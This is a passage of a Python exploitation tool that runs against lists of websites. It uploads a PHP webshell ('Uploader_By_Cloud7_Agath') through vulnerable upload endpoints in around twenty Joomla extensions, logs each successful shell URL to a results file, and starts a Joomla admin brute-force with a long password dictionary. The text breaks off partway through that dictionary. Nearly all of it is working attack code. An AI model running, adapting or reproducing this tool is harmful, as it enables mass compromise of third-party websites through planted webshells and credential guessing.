				print('[Joomla] {}{}{} ||{}Com_Redmystic{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Redmystic{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def facilejoom2(self, url):

		try:
			p = (url+'/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php.jpg')
			c = (url+'/administrator/components/com_redmystic/chart/tmp-upload-images/Uploader_By_Cloud7_Agath.php.jpg')
			asd = requests.post(p, headers=headers, files=shell)
			gg = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in gg.content:
				print('[Joomla] {}{}{} ||{}Com_Redmystic 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Redmystic 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def civijoom(self, url):

		try:
			p = (url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php')
			c = (url+"/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/Uploader_By_Cloud7_Agath.php")
			asd = requests.post(p, headers=headers, files=shell)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Civicrm{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Civicrm{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def civijoom2(self, url):

		try:
			p = (url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.phtml')
			c = (url+"/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/Uploader_By_Cloud7_Agath.phtml")
			asd = requests.post(p, headers=headers, files=shell)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Civicrm 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Civicrm 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def civijoom3(self, url):
		try:
			p = (url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php.jpg')
			c = (url+"/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/Uploader_By_Cloud7_Agath.php.jpg")
			asd = requests.post(p, headers=headers, files=shell)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Civicrm 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Civicrm 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def maianjoom(self, url):

		try:
			p = (url+'/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php')
			c = (url+'/administrator/components/com_maian15/charts/tmp-upload-images/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=shell)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Maian15{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Maian15{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def maianjoom2(self, url):

		try:
			p = (url+'/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.phtml')
			c = (url+'/administrator/components/com_maian15/charts/tmp-upload-images/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=shell)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Maian15 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Maian15 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def maianjoom3(self, url):

		try:
			p = (url+'/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php.jpg')
			c = (url+'/administrator/components/com_maian15/charts/tmp-upload-images/Uploader_By_Cloud7_Agath.php.jpg')
			asd = requests.post(p, headers=headers, files=shell)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Maian15 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Maian15 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def acymailjoom(self, url):

		try:
			p = (url+'/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php')
			c = (url+'/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/Uploader_By_Cloud7_Agath.php')
			aad = requests.post(p, headers=headers, files=shell)
			ggg = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in ggg.content:
				print('[Joomla] {}{}{} ||{}Com_Acymailing{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Acymailing{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def acymailjoom2(self, url):

		try:
			p = (url+'/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.phtml')
			c = (url+'/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/Uploader_By_Cloud7_Agath.phtml')
			aad = requests.post(p, headers=headers, files=shell)
			ggg = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in ggg.content:
				print('[Joomla] {}{}{} ||{}Com_Acymailing 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Acymailing 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def acymailjoom3(self, url):

		try:
			p = (url+'/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php.jpg')
			c = (url+'/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/Uploader_By_Cloud7_Agath.php.jpg')
			aad = requests.post(p, headers=headers, files=shell)
			ggg = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in ggg.content:
				print('[Joomla] {}{}{} ||{}Com_Acymailing 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Acymailing 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jnewsjoom(self, url):

		try:
			p = (url+'/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php')
			c = (url+'/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/Uploader_By_Cloud7_Agath.php')
			ww = requests.post(p, headers=headers, files=shell)
			aaa = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in aaa.content:
				print('[Joomla] {}{}{} ||{}Com_Jnewsletter{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jnewsletter{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def jnewsjoom2(self, url):
		try:
			p = (url+'/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.phtml')
			c = (url+'/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/Uploader_By_Cloud7_Agath.phtml')
			ww = requests.post(p, headers=headers, files=shell)
			aaa = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in aaa.content:
				print('[Joomla] {}{}{} ||{}Com_Jnewsletter 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jnewsletter 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jincjoom(self, url):

		try:
			p = (url+'/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php')
			c = (url+'/administrator/components/com_jinc/classes/graphics/tmp-upload-images/Uploader_By_Cloud7_Agath.php')
			ww = requests.post(p, headers=headers, files=shell)
			aaa = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in aaa.content:
				print('[Joomla] {}{}{} ||{}Com_Jinc{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jinc{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def jincjoom2(self, url):

		try:
			p = (url+'/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.phtml')
			c = (url+'/administrator/components/com_jinc/classes/graphics/tmp-upload-images/Uploader_By_Cloud7_Agath.phtml')
			ww = requests.post(p, headers=headers, files=shell)
			aaa = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in aaa.content:
				print('[Joomla] {}{}{} ||{}Com_Jinc 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jinc 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def maianmediajoom(self, url):

		try:
			p = (url+'/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php')
			c = (url+'/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=shell)
			asgg = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in asgg.content:
				print('[Joomla] {}{}{} ||{}Com_Maianmedia{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Maianmedia{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def maianmediajoom2(self, url):

		try:
			p = (url+'/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.phtml')
			c = (url+'/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=shell)
			asgg = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in asgg.content:
				print('[Joomla] {}{}{} ||{}Com_Maianmedia 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Maianmedia 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jnewssjoom(self, url):

		try:
			p = (url+'/administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.php')
			c = (url+'/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=shell)
			asgg = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in asgg.content:
				print('[Joomla] {}{}{} ||{}Com_Jnews{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jnews{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jnewssjoom2(self, url):

		try:
			p = (url+'/administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=Uploader_By_Cloud7_Agath.phtml')
			c = (url+'/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=shell)
			asgg = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in asgg.content:
				print('[Joomla] {}{}{} ||{}Com_Jnews 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Jnews 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def agorajoom(self, url):
		try:
			p = (url+'/index.php?option=com_agora&task=upload?name=Uploader_By_Cloud7_Agath.php')
			c = (url+'/components/com_agora/img/members/0/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=shell)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Agora{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Agora{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def agorajoom2(self, url):
		try:
			p = (url+'/index.php?option=com_agora&task=upload?name=Uploader_By_Cloud7_Agath.phtml')
			c = (url+'/components/com_agora/img/members/0/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=shell)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Agora 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Agora 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def mtree2joom(self, url):

		try:
			p = (url+'/components/com_mtree/upload.php?name=Uploader_By_Cloud7_Agath.php')
			c = (url+'/components/com_mtree/img/listings/o/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=shell)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Mtree{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Mtree{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def novajoom2(self, url):
		try:
			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/administrator/index.php?option=com_novasfh&c=uploader')
			c = (url+'/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Novasfh{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Novasfh{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass


	def collectorjoom(self, url):
		try:

			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/index.php?option=com_collector&view=filelist&tmpl=component&folder=&type=1')
			c = (url+'/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Collector{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Collector{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def osprojoom(self, url):
		try:

			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/osproperty/?task=agent_register')
			c = (url+'/images/osproperty/agent/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Osproperty{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Osproperty{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def osprojoom2(self, url):
		try:

			data = {'uploadfile':open (phtml, 'rb')}
			p = (url+'/osproperty/?task=agent_register')
			c = (url+'/images/osproperty/agent/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Osproperty 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Osproperty 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def ksadvjoom(self, url):
		try:
			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/index.php?option=com_ksadvertiser&Itemid=36&task=add&catid=0&lang=en')
			c = (url+'/images/ksadvertiser/U0/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Ksdavertiser{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Ksdavertiser{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass


	def hwdvidjoom(self, url):
		try:
			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/com_hwdvideoshare/assets/uploads/flash/flash_upload.php?jqUploader=1')
			c = (url+'/tmp/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Hwdvideoshare{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Hwdvideoshare{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def hwdvidjoom2(self, url):
		try:
			data = {'uploadfile':open (phtml, 'rb')}
			p = (url+'/com_hwdvideoshare/assets/uploads/flash/flash_upload.php?jqUploader=1')
			c = (url+'/tmp/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Hwdvideoshare 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Hwdvideoshare 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass





	def djclassjoom(self, url):
		try:
			yyy = {'name':'Uploader_By_Cloud7_Agath.phtml'}
			data = {'file':open (phtml, 'rb')}
			p = (url+'/index.php?option=com_djclassifieds&task=upload&tmpl=component')
			c = (url+'/tmp/djupload/Uploader_By_Cloud7_Agath.phtml')
			asd = requests.post(p, headers=headers, data=yyy, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Djclassifieds{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Djclassifieds{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def djclassjoom2(self, url):
		try:
			yyy = {'name':'Uploader_By_Cloud7_Agath.php'}
			dataa = {'file':open (php, 'rb')}
			p = (url+'/index.php?option=com_djclassifieds&task=upload&tmpl=component')
			c = (url+'/tmp/djupload/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, data=yyy, files=dataa)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[Joomla] {}{}{} ||{}Com_Djclassifieds 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Joomla_Shell.txt', 'a').write(c+'\n')
			else:
				print('[Joomla] {}{}{} ||{}Com_Djclassifieds 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


class Bruter:
    def __init__(self):
            list = raw_input('List : ')
            THR = raw_input('Thread : ')
            url = open(list, 'r').readlines()
            ThreadPool = Pool(int(THR))
            ThreadPool.map(self.cms, url)

    def cms(self, url):
        try:
            url = url.replace('\n', '').replace('\r', '')
            op = requests.get(url+'/admin',timeout=7)
            op2 = requests.get(url + '/administrator/index.php',timeout=7)
            op3 = requests.get(url + '/wp-login.php',timeout=7)
            op4 = requests.get(url + '/admin',timeout=7)
            if 'opencart' in op.text:
            	self.opencart(url)
            elif 'joomla' in op2.text:
            	self.joomla(url)
            elif 'wordpress' in op3.text:
            	self.wpbrute(url)
            elif 'drupal' in op4.text:
            	self.Drupal(url)


            else:
            	print"[{}{}{}Unknow CMS{}]".format(sd,sb,fm,fp), url + ' [{}PASS{}]'.format(fm,fp)



        except:
        	print"[{}{}{}TimeOut{}]".format(sd,sb,fm,fp), url + ' [{}PASS{}]'.format(fm,fp)
        	pass

    def joomla(self, url):
        try:
            Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            admins = ['admin', 'administrator', 'admin1', 'admin2', 'admin3']
            passwords = ['admin', 'pass', '123456', 'admin123', 'admin@123', 'password', '123', '123123', '12345', 'gimboroot', '123456789', 'admin1234', 'a', '1234', 'blah', '1', 'demo', 'adminadmin', 'changeme', '12345678', 'pass123', 'p@ssw0rd', 'hello', '1q2w3e4r', 'test', 'admin!@#', '1qaz2wsx', 'test123', 'admin321', 'admin888', 'admin12345', 'admin123456', 'password123', 'q1w2e3r4', 'abc123', 'temporal', 'admin1', '123mudar', 'password1', '123qwe', 'test1234', 'majordomo', '1q2w3e4r5t', 'root', '1234567', 'welcome123', '159753', '@dm1n', 'adminpass', '111111', 'admin12', 'qwe123', '1234567890', 'abcd1234', 'condor', '1qazxsw2', 'pass12345', 'zaq12wsx', '123321', 'asdf1234', 'nimda', '123654', '12qwaszx', 'passw0rd', 'foo', 'admin!@', 'pass1234', '111', '102030', 'qwerty', '1111', 'asdasd', '1234qwer', 'freedom123', '0000', 'letmein', '88888888', 'bismillah', '1q2w3e', 'romario', 'a1b2c3d4', '02071976', 'wordpress123', 'hello123', '112233', 'wordpress', 'q1w2e3r4t5', 'admin_123', 'liverpool', 'secret', '123123123', 'password1234', 'qazwsx123', '1qaz2wsx3edc', '123450', '987654321', '123qweasd', 'q1w2e3', 'qwerty123', 'welcome', 'pa55word', 'demo123', '1qazxsw23edc', '111111a', 'temp123', '12061988', 'qazwsx', 'p4ssw0rd', '123456a', 'pa55w0rd', 'admin2', 'administrator', 'qwerty99', 'qwer1234', 'q1w2e3r4t5y6', 'qwerty12345', '123789', '!qaz@wsx', 'admin54321', 'abc12345', '000000', 'changeme123', '121212', '!', 'indonesia', 'passpass', '1234abcd', '1q2w3e4r5t6y', '00', 'lol', 'a1s2d3f4', 'webmaster', 'adm1n', 'adminadmin123', '102102102', 'letmein123', '08101979', 'testtest', 'pass@word1', 'adminadminadmin', '11223344', 'temp1234', 'admindemo', 'asdqwe123', '123698', '111111111111', '12341234', 'blog123', 'asd123', 'password12345', 'master', 'google123', '1a2b3c4d', 'qweasd123', '123qwe123', '123qweasdzxc', '12qw34er', 'wpadmin', 'parola', 'testing', 'admin!', 'pass@123', '1qa2ws3ed', 'superadmin', 'super123', 'asdasd123', 'huanhuan', 'aa123456', 'a123456', '10203040', 'qaz123', '120120', 'p@$$w0rd', 'denis123', 'f00tball', 'welkom01', 'justin', '12', 'chelsea', '147896325', '101010', '123abc', 'rootwp', 'pa$$w0rd', 'temppass', 'asd', '010203', 'p@ssword', 'success1', 'qweasdzxc', 'cougar', 'adminpassword', 'admin4321', '19861986', 'admins', 'aaaaaa', 'haha1234', '321321', 'asdf', '010173', '12312312', 'qwerty777', '@dmin', 'computer', 'default', '19831983', 'porsche911', 'admin777', 'katie123', 'welcome1', 'wolf', 'demodemo', '142536', '00000000', '090909', '666666', '159357', 'a1234567', '654321', '11111111', 'paradise', 'access123', 'digital', '87654321', 'qwerty1234', 'leo', 'a1b2c3d4e5', 'newpassword', 'qazwsxedc', 'torero', '1111111', 'formula', 'start123', '0okm9ijn', 'password01', 'teste', 'mmmmm', 'happy123', 'qweqwe', 'senha123', 'passwort', 'banana', 'rahasia', '111111q', '55555', 'azertyuiop', 'asdfasdf', '123admin', '213243', 'trustno1', 'admin123123', 'yellow5', 'aa', '11', 'bond007', '123654789', 'access', '!qazxsw2', 'india123', 'arsenal1', 'nopass', '1z2x3c4v5b', 'abc123456', '14531453', 'admin_pass', 'simsim', 'azerty123', 'creative', 'zaq1xsw2', '147258369', 'haslo123', 'temp', '1122334455', 'internet', '888888', 'wedding', 'newpass', '13579246810', 'pppppppp', 'apple123', 'tester', 'password13', '114477', '123457', '7777777', '147852', 'taekwondo', 'temporary', '123456789a', 'password01!', 'landmark', 'website', 'wordpress1', '12345670', 'p0o9i8u7', 'fuckyou2', '1234567a', '1million', 'a123456789', 'pakistan', 'jordan23', '12344321', '235689', 'volcom', 'ali123', 'jesus123', '741852963', 'deniska', 'test12345', 'manager', '1112131415', 'banana11', '151515', 'dantheman', 'blink182', '147258', 'cronos', 'zxcasdqwe123', 'apple', 'dexter', 'motdepasse', 'matrix', 'topsecret', '963963', 'blog', 'pa$$word', 'P@ssw0rd', 'xxx1234', 'root123', 'monkey123', 'maker', 'admin@321', '159951', '1qazzaq1', '1234560', 'qazxsw', '222222', 'asdf123', 'azerty', '1478963', '123456aa', 'tiger', 'mohammed', 'aaa', '252525', 'testpass', 'qqqqqqqq', 'pass1', '123qwerty', '2345', 'sandra', 'priest', 'admin21', 'kamikaze', '123stella', 'jochen', 'hack', 'abcd', 'ganteng', 'reset123', 'a12345', 'goldstar', '123456abc', 'gfhjkm', 'master12', 'qwerty123456', 'test1', 'aq1sw2de3', '1234asdf', 'qazwsx12', 'blogadmin', '202020', 'admin345', 'matthew1', 'download', 'qwert12345', '210877', 'geheim', 'money123', '123465', 'testing123', 'mercury1', 'anthony1', '071073', 'online123', 'eminem', 'user', 'hackers', '1q2w3e4r5', 'passwd', 'sunshine', 'qwertyuiop', '14789632', 'hacked', 'pass12', 'daniel', '123456123', 'xxx123', 'abcd123', 'wachtwoord', 'asdfgh', '123456qwerty', 'john316', '1313', '1q2w3e4r5t6y7u8i', 'success', 'babylon', 'vagrant', 'marino13', 'qwerty5', 'general', 'champ123', '1230', 'soccer77', 'chris123', 'nirvana', '54321', '131284', 'qwaszx', 'fox', 'diablo', '111222', 'swordfish', 'bluemoon', 